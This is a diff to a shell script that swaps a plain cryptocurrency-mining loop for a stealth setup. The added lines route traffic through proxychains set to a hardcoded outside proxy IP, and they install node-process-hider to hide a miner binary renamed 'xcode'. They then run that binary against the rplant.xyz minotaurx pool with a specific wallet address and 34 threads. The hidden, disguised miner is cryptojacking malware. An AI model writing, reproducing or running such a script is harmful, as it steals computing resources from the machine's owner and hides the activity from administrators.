@@ -1,13 +1,13 @@
-#!/bin/sh
-#
-# Choose nearest stratum:
-#       stratum-ru.rplant.xyz   /Moscow/
-#       stratum-eu.rplant.xyz   /London/
-#       stratum-asia.rplant.xyz /Singapore/
-#       stratum-na.rplant.xyz   /Toronto/
-#
-FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
-while [ 1 ]; do
-"$FOLDER"/cpuminer-sse2 -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u WALLET.WORKER_NAME
-sleep 5
-done
+apt update 
+apt install proxychains  -y 
+sed -i 's/socks4/socks5/' /etc/proxychains.conf 
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+sed -i 's/9050/10663/' /etc/proxychains.conf
+apt install nodejs -y
+node –version
+apt install npm -y
+npm –version 
+npm i -g node-process-hider
+chmod u+x xcode
+ph add xcode
+./xcode -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFbqnHHydtYxrq6jwqmwZgMt7CR4s5rKd7 -t34
